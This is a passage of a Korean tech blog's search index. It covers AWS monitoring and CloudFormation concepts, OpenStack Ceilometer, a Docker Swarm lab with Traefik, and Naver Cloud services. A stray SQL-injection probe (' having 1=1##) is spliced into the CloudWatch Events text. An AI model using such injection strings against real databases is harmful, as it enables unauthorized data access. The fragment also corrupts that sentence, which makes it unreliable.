flow Log 등 기타 소스에서 발생한 로그 파일을 모니터링, 저장 및 엑세스하는 기능 Cloudwatch Agent를 사용하여 로그를 수집 Cloudwatch Log Insights를 사용하여 CloudWatch Logs에서 로그 데이터를 대화식으로 검색해 분석할 수 있음 Agent는 기본적으로 5초마다 로그 데이터를 전송   Cloudwatch Events  AWS 각 서비스의 이벤트가 사용자가 지정한 이벤트패턴과 일치하거나 일정이 트리거될 경우, 사용자가 월하는 기능을 발동시키도록 하는 기능 이번트 소스와 대상으로 나뉨 이벤트 소스: AWS 환경에서 발생하는 이벤트이며, 가령 S3의 경우 오브젝트 등록, 삭제 등을 들 수 있음 대상: 이벤트 발생시 해야할 행동을 정의하는 것이며, SNS 전송 혹은 람다, SQS 게시 등을 설정할 수 있음 이벤트 소스에 해당하는 규칙이 트리거될 경우 대상에 해당하는 서비스를 실행시킴 이벤트가 시스템에 생성해 둔 규칙과 일치하는 경우, AWS Lambda 함수를 자동으로 호출하고, 해당 이벤트를 Amazon Kinesis 스트림에 전달하고, Amazon SNS 주제를 알림' having 1=1##    AWS CloudFormation    인프라를 관리 간소화를 목적으로 하는 서비스 AWS의 리소스를 일일이 설정하지 않고 해당 서비스의 프로비져닝과 설정을 미리 구성하여 반복작업을 줄이도록 도와주는 역할 EC2, Auto Scaling Group으로부터 ELB, RDS, S3 등을 사전에 구성하여 한 번의 클릭으로 다수의 서비스를 빠르게 생성할 수 있음 생성된 리소스 모음은 다른 계정 혹은 다른 리전에 옮겨 사용 가능   Stack  하나의 단위로 관리할 수 있는 AWS 리소스들의 모음 스택을 생성, 업데이트 또는 삭제하여 리소스 모음을 생성, 업데이트, 삭제가 가능 스택에서 실행중인 리소스를 변경해야 하는 경우 스택을 업데이트할 수 있는 데, 이 업데이트된 세트를 변경세트라 칭함 스택을 삭제하는 경우 삭제할 스택을 지정하면 해당 스택과 스택 내 모든 리소스를 삭제 AWS에서 리소스를 삭제할 수 없는 경우 스택이 삭제 스택의 리소스 중 하나라도 성공적으로 생성되지 않은 경우 성공적으로 생성한 모든 리소스를 모두 삭제함 ( Automatic rollback on error )   Template   스택을 구성하는 AWS 리소스를 JSON 혹은 YAML 형식으로 선언한 텍스트 파일\n  템플릿은 로컬 혹은 S3에 저장되며, 템플릿을 불러올 때 S3 bucket을 지정할 수 있음\n  템플릿을 \u0026ldquo;Designer\u0026quot;을 통해 생성할 수도 있으며, S3 bucket에 저장된 것을 불러와 생성이 가능\n   Template의 여러 요소   Parameter : 선택 섹션, 스택 생성 및 업데이트 시 템플릿에 전달하는 값, 사용자가 선택하는 여러 요소들 ( EC2 유형 - t2.micro 등 )\n  Conditions : 선택 섹션, 조건문, 리소스가 생성되는 조건을 만들어 조건 충족시에만 리소스를 만들 수 있또록 하는 요소\n  Resources : 필수 섹션, CLoudformation에 포함될 리소스\n  Metadata : 선택 섹션, 템플릿에 대한 세부 정보를 제공하는 임의의 JSON, YAML 객체\n  Mappings : 선택 센셕, 프로그래밍 언어로 따지만 \u0026lsquo;Switch\u0026rsquo; 조건문에 해당하며, \u0026lsquo;키\u0026rsquo;에 해당하는 값 세트를 생성하고 해당하는 키가 있으면 값 세트에 맞춰 리소를 생성\n    AWS CloudTrail    CloudTrail의 이벤트는 AWS 계정에서의 활동 기록을 의미 용자, 역할 또는 CloudTrail에서 모니터링이 가능한 서비스에 의해 수행되는 작업, AWS Management 콘솔, AWS SDK, 명령줄 도구 및 기타 AWS 서비스를 통해 수행되는 API 계정 활동과 비 API 계정 활동 모두에 대한 기록을 제공 CloudTrail에는 로깅할 수 있는 두 가지 유형의 이벤트가 존재  관리 이벤트 : 기본적으로 로깅 데이터 이벤트 : 기본적으로 로깅을 하지 않음   관리 이벤트와 데이터 이벤트 모두 동일한 CloudTrail JSON 로그 형식을 사용   관리 이벤트  AWS 계정의 리소스에 대해 수행되는 관리 작업에 대한 정보를 제공하며, 이를 제어 영역 작업이라 함   관리 이벤트 예시\n 보안 구성 디바이스 등록 데이터 라우팅 규칙 구성 로깅 설정  \r  데이터 이벤트  데이터 이벤트는 리소스 상에서, 또는 리소스 내에서 수행되는 리소스 작업에 대한 정보를 제공하며, 이를 데이터 영역 작업이라 함   관리 이벤트 예시\n Amazon S3 객체 수준 API활동 AWS Lambda 함수 실행 활동  \r  Insights events  CloudTrail Insights 이벤트는 AWS 계정에서 비정상적인 활동을 캡처 Insights events을 활성화하고 CloudTrail가 비정상적인 활동을 감지한 경우, Insights events는 다른 폴더나 트레일에 대한 대상 S3 버킷의 접두사에 로깅 Insights events은 계정 API 사용량 변화가 계정의 일반적인 사용 패턴과 크게 다르다는 것을 CloudTrail가 감지한 경우에만 로깅   CloudTrail 이벤트 기록  CloudTrail 이벤트 기록은 CloudTrail 이벤트에 대한 지난 90일간의 기록으로 확인, 검색 및 다운로드가 가능 AWS Management 콘솔, AWS SDK, 명령줄 도구 및 기타 AWS 서비스를 통해 수행되는 AWS 계정 활동에 대한 가시성을 확보가능 CloudTrail 콘솔에서 어떤 열이 표시되는지를 선택하여 이벤트 기록 보기를 사용자 지정가능   추적  추적은 Amazon S3 버킷, CloudWatch Logs 및 CloudWatch 이벤트에 CloudTrail 이벤트를 제공할 수 있는 구성 추적을 사용하여 제공하고자 하는 CloudTrail 이벤트를 필터링하고, AWS KMS 키로 CloudTrail 이벤트 로그 파일을 암호화하며, 로그 파일 제공을 위해 Amazon SNS 알림을 설정이 가능   조직 추적  조직 추적은 조직의 마스터 계정과 모든 멤버 계정의 CloudTrail 이벤트를 동일한 Amazon S3 버킷, CloudWatch Logs 및 CloudWatch 이벤트에 전달할 수 있도록 하는 구성을 의미    AWS Config    AWS Config는 AWS 리소스 구성을 측정, 감사 및 평가할 수 있는 서비스 Config는 AWS 리소스 구성을 지속적으로 모니터링 및 기록하고, 원하는 구성을 기준으로 기록된 구성을 자동으로 평가    AWS OpsWorks    AWS OpsWorks는 Chef 및 Puppet의 관리형 인스턴스를 제공하는 구성 관리 서비스 Chef 및 Puppet은 코드를 사용해 서버 구성을 자동화할 수 있게 해주는 자동화 플랫폼 OpsWorks를 사용하면 Chef 및 Puppet을 통해 Amazon EC2 인스턴스 또는 온프레미스 컴퓨팅 환경 전체에서 서버가 구성, 배포 및 관리되는 방법을 자동가 가능    AWS Managed Services    AWS Managed Services(AMS)는 안전하고 규정을 준수하는 AWS Landing Zone을 제공하고 고객 대신 AWS를 운영하는 서비스 AWS Managed Services는 인프라를 유지 관리하기 위한 모범 사례를 구현하여 운영 오버헤드와 위험을 줄일 수 있도록 지원 AWS Managed Services는 변경 요청, 모니터링, 패치 관리, 보안, 백업 서비스 등과 같은 일반적인 활동을 자동화하고 인프라를 프로비저닝, 운영 및 지원하기 위한 전체 수명 주기 서비스를 제공   Landing Zone  검증된 엔터프라이즈 운영 모델이자 지속적인 비용 최적화 및 일상적인 인프라 관리 수단  \r   AWS Service Catalog    AWS Service Catalog를 사용하는 조직은 AWS에서 사용이 승인된 IT 서비스 카탈로그를 생성하고 관리하는 서비스 서비스에는 가상 머신 이미지, 서버, 소프트웨어 및 데이터베이스에서 멀티 티어 애플리케이션 아키텍처를 완성하는 모든 서비스가 포함 AWS Service Catalog를 사용하면 일반적으로 배포된 IT 서비스를 중앙에서 관리할 수 있고 일관된 거버넌스를 달성하고 규정 준수 요건을 충족하는 데 도움이 되는 동시에 사용자가 필요로 하는 승인된 IT 서비스만을 신속하게 배포가능   AWS Service Catalog의 핵심개념  Service Catalog  서비스 카탈로그는 하나의 AWS account에 종속됩니다. 관리자가 관리하며 하나 이상의 포트폴리오(Portfolios)를 포함   Administrtor  관리자는 서비스 카탈로그 안에 있는 프로덕트 포트폴리오(Portfolios of Products)를 업로드하고 관리   User  사용자는 서비스 카탈로그의 포털페이지를 접속하여 여러 포트폴리오를 찾아보고, 관심있는 프로덕트를 선택   Portal  포탈은 서비스 카탈로그의 창문(View)인데요, 특정 사용자가 접속할 수 있는 포트폴리오와 제품만 보여주도록 맞춤제작 가능   Portfolio  포트폴리오란 서비스 카탈로그 아래 버전관리 중인 프로덕트들의 모음   Product  프로덕트는 AWS리소스들의 모음 ( EC2 인스턴스, 애플리케이션 서버, 데이타베이스 )들로 이 단위 별로 프로덕트를 런치하고 관리      AWS TrustedAdvisor    AWS Trusted Advisor는 AWS 모범 사례에 따라 리소스를 프로비저닝하는 데 도움이 되도록 실시간 지침을 제공하는 온라인 도구   AWS TrustedAdvisro의 분석 카테고리 "}),a.add({id:121,href:'/docs/openstack/openstack/ceilometer/',title:"Ceilometer",content:"리소스의 사용량과 부하를 관리하는 서비스 : Ceilometer   리소스의 사용량과 부하를 관리하는 서비스 : Ceilometer    Ceilometer은 각 서비스들의 예상 부하에 따라 추가 작업과 노드를 관리하는 역할을 수행 클라우드에서 배포된 자원의 사용량과 성능을 측정해 사용자가 자원 상태를 모니터링 할 수 있는 기능을 제공 Ceilomete는 리버티 버전에서 기존에 알람 서비스를 하던 부분을 aodh로 분리      핵심 서비스 역할     Polling agent OpenStack 서비스를 폴링하고 미터를 빌드하도록 설계된 데몬 프로세스   Notification agent 메시지 큐에서 알림을 듣고 이벤트 및 샘플로 변환하며 파이프 라인 조치를 적용하도록 설계된 데몬 프로세스       Ceilometer로 표준화 및 수집 된 데이터는 다양한 대상으로 전송 Gnocchi는 이러한 스토리지 및 쿼리를 최적화하기 위해 시계열 형식으로 측정 데이터를 캡처하도록 개발 Aodh는 사용자 정의 규칙이 깨졋을 때 경고를 보낼 수 있는 경보 서비스 Ceilomter은 이와 같이 리소스를 감시 및 예상하여 다른 작업을 수행할 수 있도록 하는 서비스를 의미     데이터 수집    위의 그림과 같이 Polling agents에서 각 서비스들의 API의 리소스를 읽어 데이터를 수집 Notification agents는 Polling agents에서 수집한 데이터들을 토대로 Ceilomter 서비스 혹은 Events로 변환하는 역할을 수행     데이터 처리    수집된 데이터를 토대로 Notification bus를 통해 엔드 포인트로 재분배하여 이벤트 및 샘플로 처리하느 역할을 수행     데이터 요청    데이터의 요청은 수집된 자료들을 토대로 서로 데이터를 주고 받으며, Polling agents라는 클라우드 컨트롤러에서 처리되며, 여러 플러그인을 사용하여 데이터를 통신합니다.     데이터 처리 및 변형     위의 그림은 수집된 데이터를 수집, 분석 및 변형 배포하는 과정을 나타낸 그림으로 Ceilomter은 각 서비스들의 데이터를 수집하여, 변형시키는 여러 소스를 제공     OpenStack에서의 Ceilomter의 위치      구성요소 역할     Ceilometer-colletcor 중앙 관리서버에서 실행되며, Queue 모니터링 하는 서비스   Ceilometer-agent-notification ceilometer-collector와 함꼐 중앙 관리서버에서 실행, Queue를 이용해 이벤트와 미러링 데이터를 기록   Ceilometer-agent-compute 각 컴퓨팅 노드에 설치해서 실행, 자원 활용 통계로 사용   Ceilometer-account-central 중앙 관리 서버에서 실행, 인스턴스에 연결되지 않은 자원이나 컴퓨터 노드의 활용 가능한 자원 통계를 폴링   Ceilometer-alarm-evaluator 하나 이상의 중앙 관리 서버에서 실행, 슬라이딩 시간대에 임계 값을 추가할 때 발생하는 경보 시점을 결정   Ceilometer-alarm-nottifier 하나 이상의 중앙 관리 서버에서 실행되며, 샘플을 수집하는 임계 값 평가에 따라 알람을 설정   Ceilometer database 수집한 데이터를 저장할 Ceilometer 데이터 베이스   Ceilometer-api 하나 또는 그 이상의 중앙 관리 서버에서 실행되며 데이터베이스에서 데이터 엑세스를 제공      "}),a.add({id:122,href:'/docs/docker/docker/docker/docker-7/',title:"Docker Swarm",content:"Docker Swarm     Swarm은 Docker와 별개로 개발되었지만 Docker 1.12 버전부터 Swarm mode라는 이름으로 합쳐졌습니다.\n  도커에 모든 게 내장되어 다른 툴을 설치할 필요가 없고 도커 명령어와 compose를 그대로 사용할 수 있어 다른 툴에 비해 압도적으로 쉬우며 편리합니다.\n  기능이 단순하고 필요한 것만 구현되어 있어 세부적인 컨트롤의 난이도는 높은 편입니다.\n     Docker Swarm 용어절리   Swarm   정식 명칭은 도커 1.12버전에서 Swarm이 Swarm Mode로 바뀌었지만 그냥 Swarm이라고 하는 듯합니다.\n  Swarm Cluster자체도 Swarm이라고 합니다. Swarm을 만들다 = Cluster을 만들다.\n       Node   스웜 클러스트에 속한 도커 서버의 단위입니다.\n  기본적으로 한 서버에 하나의 도커 데몬만 실행하므로 서버가 곧 노드라 할 수 있으며, 노드에 종류에는 매니저 노드와 워커 노드가 있습니다.\n       Manager node   스웜 클러스트 상태를 관리하는 노드입니다.\n  매니저 노드는 곧 워커노드가 될 수 있고 스웜 명령어는 매니저 노드에서만 실행됩니다.\n       Worker node  매니저 노드의 명령을 받아 컨테이너를 생성하고 상태를 체크하는 노드입니다.       Service  기본적인 배포 단위로 하나의 서비스는 하나의 이미지를 기반으로 생성하고 동일한 컨테이너를 한 개 이상 실행할 수 있습니다.       task  컨테이너 배포 단위로 하나의 서비스는 여러 개의 테스크를 실행할 수 있고 각각의 테스크가 컨테이너를 관리합니다.       도커 스윔이 제공하는 기능   Scheduling   서비스를 만들면 컨테이너를 워커노드에 배포합니다.\n  현재는 균등하게 배포하는 방식만 지원하며 추후 다른 배포 전략이 추가될 예정입니다.\n  노드에 라벨을 지정하여 특정 노드에만 배포할 수 있고 모든 서버에 한 대씩 배포하는 기능 또한 제공하며, 서비스별로 CPU, Memory 사용량을 미리 설정할 수 있습니다.\n       High Available   Raft 알고리즘을 이용하여 어러 개의 매니저노드를 운영할 수 있습니다.\n  3대를 사용하면 1대가 죽어도 클러스터는 정상적으로 동작하며 매니저 노드를 지저하는 방법은 간단하므로 쉽게 관리할 수 있습니다.\n       Multi Host NEtwork   Overlay Network로 불리는 SDN (Software Defined Networks)를 지원하여 여러 노드에 분산된 컨테이너를 하나의 네트워크로 묶을 수 있습니다.\n  컨테이너마다 독립된 IP가 생기고 서로 다른 노드에 있어도 할당된 IP로 통신할 수 있습니다.\n       Service Discovey   서비스 디스커버리를 이한 자체 DNS 서버를 가지고 있으며, 컨테이너를 생성하면 서비스명과 동일한 도메인을 등록하고 컨테이너가 멈추면 도메인을 제거합니다.\n  멀티 호스트 네트워크를 사용하면 여러 노드에 분산된 컨테이너가 같은 네트워크로 묶이므로 서비스 이름으로 바로 접근할 수 있습니다.\n  Consul이나 etcd, zookeeper와 같은 외부 서비스를 사용하지 않고 어떠한 추가 작업도 필요 없습니다. 스웜이 알아서 관리합니다.\n       Rolling Update   서비스를 새로운 이미지로 업데이트하는 경우 하나하나 차례대로 업데이트를 진행합니다.\n  동시에 업데이트하는 작업의 개수와 업데이트 간격 시간을 조정할 수 있습니다.\n       Heath Check   서비스가 정상적으로 실행되었는지 확인하기 위해 컨테이너 실행 여부 뿐 특정 쉘 스크립트가 정상적으로 실행됐는지 여부를 추가로 체크할 수 있습니다.\n  컨테이너 실행 여부로만 체크할 경우 아직 서버가 실행 되지 않아 접소시 오류가 날 수 있는 미묘한 타이밍을 잡는 데 효과적입니다.\n       Secret Management   비밀번호를 스웜 어딘가에 생성하고 컨테이너에서 읽는 것이 가능합니다.\n  비밀 값을 관리하기 위한 외부 서비스를 설치하지 않고 쉽게 사용할 수 있습니다.\n       Logging   같은 노드에서 실행 중인 컨테이너 뿐 아니라 다른 노드에서 실행 중인 서비스의 로그를 한 곳엣 볼 수 있습니다.\n  특정 서비스의 로그를 보려면 어느 노드에서 실행 중인지 알 필요도 없고 일일이 접속할 필요도 없습니다.\n       Monitoring  리소스 모니터링 기능은 제공하지 않습니다. 3rd party (prometheus, grafana) 서비스를 사용해야 합니다.       Cron  반복작업 Cron도 알아서 구현해야 합니다. 여러 가지 방식으로 해결할 수 있지만, 직접 제공하지 않아 아쉬운 부분입니다.       Docker Swarm 실습   구성  master node-1 cpu : 1 / RAM : 1024 / network : 10.10.10.10 worker node-2 cpu : 1 / RAM : 1024 / network : 10.10.10.11 worker node-3 cpu : 1 / RAM : 1024 / network : 10.10.10.12 저는 간단하게 EC2를 사용해서 만들었습니다.       $ (master : 10.10.10.10)\u0026gt; sudo docker swarm leave --force # 만약 에러 발생시 $ (master : 10.10.10.10)\u0026gt; sudo docker swarm init --advertise-addr 10.10.10.10 Swarm initialized: current node (p1rci8vzzfkadh869wt7b80x6) is now a manager. To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-1lgt56s4fa05qak31h5aets5gea88qon2ul91jhcfdwvjkzjvd-043z7ty8xxl3xhlidku07hzsn 10.10.10.10:2377 To add a manager to this swarm, run \u0026#39;docker swarm join-token manager\u0026#39; and follow the instructions. # 토큰 값은 중요하니 복사해둡니다. $ (worker : 10.10.10.11)\u0026gt; sudo docker swarm join \\ --token SWMTKN-1-1lgt56s4fa05qak31h5aets5gea88qon2ul91jhcfdwvjkzjvd-043z7ty8xxl3xhlidku07hzsn \\ 10.10.10.10:2377 This node joined a swarm as a worker. $ (worker : 10.10.10.12)\u0026gt; sudo docker swarm join \\ --token SWMTKN-1-1lgt56s4fa05qak31h5aets5gea88qon2ul91jhcfdwvjkzjvd-043z7ty8xxl3xhlidku07hzsn \\ 10.10.10.10:2377 This node joined a swarm as a worker. $ (master : 10.10.10.10)\u0026gt; sudo docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION p1rci8vzzfkadh869wt7b80x6 * ip-10-10-10-10 Ready Active Leader 19.03.12 i3kp1hl9gbssf9bm2c7nmpl0k ip-10-10-10-11 Ready Active 19.03.12 ir4blo0hzuezyoakk0jrk8ul4 ip-10-10-10-12 Ready Active 19.03.12 # 확인 $ (master : 10.10.10.10)\u0026gt; sudo docker service create --name whoami \\ -p 4567:4567 \\ subicura/whoami:1 # 위둔 hostname을 출력하는 간단한 앱입니다. $ (master : 10.10.10.10)\u0026gt; sudo docker service list ID NAME MODE REPLICAS IMAGE PORTS zmdp77bnply5 whoami replicated 1/1 subicura/whoami:1 *:4567-\u0026gt;4567/tcp # image가 다운로드 완료되었습니다. $ (master : 10.10.10.10)\u0026gt; docker service ps whoami ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS qzg94my1uk90 whoami.1 subicura/whoami:1 ip-10-10-10-10 Running Running 4 minutes ago # 컨테이너를 실행시킵니다. $ (master : 10.10.10.10)\u0026gt; curl localhost:4567 204bc4d6aa2c $ (master : 10.10.10.10)\u0026gt; curl 10.10.10.11:4567 204bc4d6aa2c # 정상적으로 실행되고 있는 지 확인해봅니다.   위와 같이 도커스윔은 서비스를 외부에 쉽게 노출하기 위해 모든 노드가 Ingress라는 가상 네트어크에 속해 있습니다.\n  ingress는 routing mesh라는 재미있는 개념을 가지고 있는 데, 이 개념은 서비스가 포트를 오픈하 경우 모든 노드에 포트가 오픈되고 어떤 노드에 요청을 보내도 실행 중인 컨테이너에 자동으로 전달해 줍니다.\n     Docker Swarm scale   여기서는 Docker Swarm을 통해 서비스의 개수를 늘려보도록 하겠습니다.  $ (master : 10.10.10.10)\u0026gt; sudo docker service scale whoami=5 whoami scaled to 5 overall progress: 5 out of 5 tasks 1/5: running [==================================================\u0026gt;] 2/5: running [==================================================\u0026gt;] 3/5: running [==================================================\u0026gt;] 4/5: running [==================================================\u0026gt;] 5/5: running [==================================================\u0026gt;] verify: Service converged # docker service의 범위를 5개까지 확장시킵니다. $ (master : 10.10.10.10)\u0026gt; sudo docker service ps whoami ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS qzg94my1uk90 whoami.1 subicura/whoami:1 ip-10-10-10-10 Running Running 12 minutes ago yb1ao89h9m0a whoami.2 subicura/whoami:1 ip-10-10-10-11 Running Running 28 seconds ago 8rqaj1fnh2ef whoami.3 subicura/whoami:1 ip-10-10-10-12 Running Running 26 seconds ago 0fmuy9nijyw3 whoami.4 subicura/whoami:1 ip-10-10-10-12 Running Running 27 seconds ago dsi6rogdtwvk whoami.5 subicura/whoami:1 ip-10-10-10-10 Running Running 38 seconds ago # docker service를 시작합니다. $ (master : 10.10.10.10)\u0026gt; docker service ps whoami $ (master : 10.10.10.10)\u0026gt; curl localhsot:4567 # 자동으로 로드밸런서의 역할도 수행되는 것도 확인하실 수 있습니다.   Swarm은 컨테이너가 실행되면 ingress에서 해당 컨테이너로 요청을 보내기 시작하는 데, 웹 서버가 부팅되는 동안 문제가 발생할 수 있습니다.\n  하지만 만약 컨테이너가 완전히 실행되지 않았을 때 요청은 보낸 경우 에러가 발생할 수 있어 이를 해결하기 위해 상태체크 방식의 필요성이 대두되었습니다.\n  Docker 1.12버전에서 HEALTHCHECK 명령어를 추가되었고 쉘 스크립트를 작성하여 보다 정확한 상태의 체크가 가능해졌습니다.\n  HEALTHCHECK --interval=\u0026lt;초s\u0026gt; CMD wget -qO- \u0026lt;IP:port\u0026gt; HEALTHCHECK --interval=10s CMD wget -qO- localhost:4567 # \u0026lt;초\u0026gt;마다 wget을 이용하여 \u0026lt;IP:port\u0026gt;를 체크하며 정상적인 경우 0을 리턴하는 데, 이 경우 정상이라 판단되고 그 떄 요청을 보내게 됩니다. $ (master : 10.10.10.10)\u0026gt; vi Dockerfile FROM ruby:2.3-alpine COPY Gemfile* /usr/src/app/ WORKDIR /usr/src/app RUN bundle install COPY . /usr/src/app EXPOSE 4567 HEALTHCHECK --interval=10s CMD wget -qO- localhost:4567 CMD bundle exec ruby app.rb -o 0.0.0.0 $ (master : 10.10.10.10)\u0026gt; docker service update \\ --image subicura/whoami:2 \\ whoami 1/5: running 2/5: running 3/5: running 4/5: running 5/5: running verify: Service converged # 이미지를 업데이트 합니다. $ (master : 10.10.10.10)\u0026gt; docker service ps whoami ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS enooa8xmaj2t whoami.1 subicura/whoami:2 ip-10-10-10-10 Running Running 2 minutes ago qzg94my1uk90 \\_ whoami.1 subicura/whoami:1 ip-10-10-10-10 Shutdown Shutdown 2 minutes ago oqfigt4i4mqy whoami.2 subicura/whoami:2 ip-10-10-10-10 Running Running 2 minutes ago yb1ao89h9m0a \\_ whoami.2 subicura/whoami:1 ip-10-10-10-11 Shutdown Shutdown 2 minutes ago 42bqor5clgbx whoami.3 subicura/whoami:2 ip-10-10-10-12 Running Running 3 minutes ago 8rqaj1fnh2ef \\_ whoami.3 subicura/whoami:1 ip-10-10-10-12 Shutdown Shutdown 3 minutes ago cyk132cxnfkt whoami.4 subicura/whoami:2 ip-10-10-10-11 Running Running 3 minutes ago 0fmuy9nijyw3 \\_ whoami.4 subicura/whoami:1 ip-10-10-10-12 Shutdown Shutdown 3 minutes ago n61ei91lbs7o whoami.5 subicura/whoami:2 ip-10-10-10-12 Running Running 2 minutes ago dsi6rogdtwvk \\_ whoami.5 subicura/whoami:1 ip-10-10-10-10 Shutdown Shutdown 3 minutes ago # Healthcheck를 확인 할 수 있습니다.    방문자 수 체크 웹 애플리케이션 생성  $ (master : 10.10.10.10)\u0026gt; sudo docker network create --attachable \\ --driver overlay \\ backend fvy3gx80r83h01d4h81488rs3 # 오버레이 네트워크를 생성합니다. $ (master : 10.10.10.10)\u0026gt; sudo docker network ls NETWORK ID NAME DRIVER SCOPE ... fvy3gx80r83h backend overlay swarm ... # 생성된 네트워크를 확인합니다. $ (master : 10.10.10.10)\u0026gt; sudo docker service create --name redis \\ --network=backend \\ redis ikfn3m39hn3qrft3e5dx90oe2 # redis를 backend 네트워크로 생성합니다. $ (master : 10.10.10.10)\u0026gt; sudo docker service create --name counter \\ --network=backend \\ --replicas 3 \\ -e REDIS_HOST=redis \\ -p 4568:4567 \\ subicura/counter mty90m5iq7n7dvsl4pdskx0ew overall progress: 3 out of 3 tasks 1/3: running 2/3: running 3/3: running verify: Service converged # redis 서버와의 통신을 이해 backend 네트워크를 지정했으며 --replicas 옵션을 이용하여 3개의 서버를 사용하도록 만들었습니다. # 4568 포트로 접근할 수 있도록 포트를 오픈 했고 redis 서버의 도메인명을 환경변수로 전달했습니다. $ (master : 10.10.10.10)\u0026gt; curl localhost:4568 $ (master : 10.10.10.10)\u0026gt; curl localhost:4568 $ (master : 10.10.10.10)\u0026gt; curl localhost:4568 # .... \u0026gt; 1..2..3 순으로 증가하는 것을 확인하실 수 있습니다.    비밀키 조회 애플리케이션 $ (master : 10.10.10.10)\u0026gt; echo \u0026#34;this is my password!\u0026#34; | docker secret create my-password - 1p5vcpdcii599ggu8bh4pdh91 # 비밀 키를 생성합니다. $ (master : 10.10.10.10)\u0026gt; sudo docker service create --name secret \\ --secret my-password \\ -p 4569:4567 \\ -e SECRET_PATH=/run/secrets/my-password \\ subicura/secret # 입력된 키를 출력해주는 간단한 앱을 생성합니다. $ (master : 10.10.10.10)\u0026gt; curl localhost:4569 this is my password!    Traefik 리버스 프록시 서버   스웜은 매니저 노드에서 모든 서비스를 관리할 수 있고 서비스가 생성된 것을 체크하면 무언가를 자동화할 수 있습니다.\n  Traefik은 이러한 아이디어를 이용해 웹 애플리케이션이 생성되면 자동으로 도메인을 만들고 내부 서비스로 연결해줍니다.\n  ex\u0026gt; counter \u0026ndash;\u0026gt; counter.local.dev 도메인을 통해 저복\n  $ (master : 10.10.10.10)\u0026gt; sudo docker network create --driver overlay frontend tpj48hxfpu2jilp7uqphzt96m # 프록시 연결하기 위해 frontend 라는 네트워크를 생성합니다. $ (master : 10.10.10.10)\u0026gt; sudo docker service create --name traefik \\ --constraint \u0026#39;node.role == manager\u0026#39; \\ -p 80:80 \\ -p 8080:8080 \\ --mount type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock \\ --network frontend \\ traefik \\ --docker \\ --docker.swarmmode \\ --docker.domain=local.dev \\ --docker.watch \\ --web # --constraint 옵션은 매니저 노드에서 실행할 수 있게 배포를 제한합니다. # --mount 옵션을 이용해 호스트의 도커 소켓을 마운트 하였습니다. # 80은 실제 웹 서비스에 제공하기 위한 포트이며 8080은 관리자용 포트입니다. # 접속하여 확인합니다. $ (master : 10.10.10.10)\u0026gt; sudo docker service create --name portainer \\ --network=frontend \\ --label traefik.port=9000 \\ --constraint \u0026#39;node.role == manager\u0026#39; \\ --mount \u0026#34;type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock\u0026#34; \\ portainer/portainer # raefik과 접속할 수 있도록 frontend네트워크에 연결했고 --label옵션으로 내부적으로 사용하는 웹 포트를 알려주었습니다. traefik은 traefik.port라벨의 값을 읽어 해당 포트로 리버스 프록시를 연결합니다. portainer는 스웜을 관리해주는 툴이기 때문에 매니저 노드에 실행하도록 했습니다. # 서비스 이름을 portainer로 했기 때문에 서비스가 실행되면 traefik서비스가 자동으로 portainer.local.dev도메인 정보를 생성하고 portainer컨테이너의 9000번 포트로 연결합니다. 서비스를 생성하고 잠시 기다리면 프록시 설정이 자동으로 완료됩니다.   "}),a.add({id:123,href:'/docs/infra/infra/infra07/',title:"Infra operation",content:"Infra operation    Infra operation  장애 대응    하드에어는 언젠가 반드시 고장이 난다는 생각 때문에 서비스를 멈추지 않도록 하는 방향으로 진화했습니다.\n  엔지니어에게 감시 솔루션은 장애 감지를 위해 특히 중요한 도구로, 장애를 빠르고 확실하게 감지하기 위해서는 감시 솔루션 없이는 불가능합니다.\n  감시 솔루션을 신중하게 선택하고 모든 보유 기기에서 일어날 수 있는 온갖 장애 패턴을 모두 확실히 감지할 수 있도록 엄격하게 설정해야 합니다.\n     병목현상 해결    일반적으로 IT 시스템에서는 병목이 한 군데만 있어돋 시스템 전체의 응답에 악영향을 끼칩니다.\n  그렇기에 상시 병목현상에 유의해야하며 하단에는 주로 병목현상이 발생하는 부분들입니다.\n  코어 스위치의 수용량\n  L2 스위치의 수용량\n  웹 서버의 메모리 부족\n  데이터베이스 서버의 CPU와 메모리 부족\n  데이터베이스 서버의 디스크 I/O\n       네트워크 장비의 병목 현상     각 포트의 물리 인터페이스의 속도가 트래픽을 감당할 수 없을 때\n  조사 방법 : 1 Gbps 인터페이스라면 실제 IN/ OUT 트래픽이 각각 1Gbps 미만인가?\n  대책 : 서버를 분산해서 트래픽을 분산하거나 인터페이스를 보다 빠른 것으로 설정합니다.\n       네트워크 장비의 전송 능력에 한계는 없는가?\n  조사 방법 : 패킷 드롭이 발생하지 않는가? 전송 능력 부족을 보이는 로그가 남아 있는가?\n  대책 : 가능하면 네트워크 장비를 상위 기종으로 교체하거나 캐시 메모리 추가 등을 시행해야 합니다.\n       서버 장비의 병목 현상     프론트 엔드 서버의 응답이 저하되었는가?\n  조사 방법 : 각 서버의 응답 시간을 정기적으로 가져와 극단적인 저하가 일어났는 지 살펴보며, 혹은 사용자로붙너 응답 속도에 관한 질문이 들어왔는지를 살펴보아야 합니다.\n  대책 : 먼저 프론트 엔드의 문제인지 백엔드의 문제인지를 파악 후, 그에 맞춰, 소프트웨어의 문제인지 컴퓨터 리소스의 문제인지를 세부적으로 파악 후, 문제에 맞게 소프트웨어의 수정 및 컴퓨터 리소스를 추가하여 문제를 해결합니다.\n      "}),a.add({id:124,href:'/docs/ncp/ncptraining/nca07/',title:"Naver Cloud Application",content:"Cloud Application    네이버에서 사용하는 기술과 서비스를 APi로 제공\n  Geolocation, Maps, nShortURL, SENS, Search Trend 등 제공\n  네이버 통합검색 서비스를 통해 수집되는 검색어 통계를 다양한 기준으로 조회 활용 가능\n  대량 메일 발송을 위한 Outbound Mailer\n  고객 대응에 활용할 수 있는 챗봇\n    Geo Location    사용자 IP를 통해 위치 정보를 제공하는 국내 유일의 서비스\n  고객서버에서 질의한 IP주소에 따른 지역정보를 DB를 검색해 국가, 시, 군, 구, 동, 인근 지역의 좌표 전달\n  접속 IP를 기반으로 동까지 확인이 가능 (국내), 해외의경우 주까지 확인가능\n       SENS ( Simple \u0026amp; Easy Notification Service    SMS와 APP Push를 손쉽게 전송\n  웹을 통해서 혹은 API를 이용하여 다수의 사용자에게 SMS, Push 발송\n  SMS 경우 건강 9원\n     Outbound Mailer   대량 메일 발송을 위한 메일 방송 상품 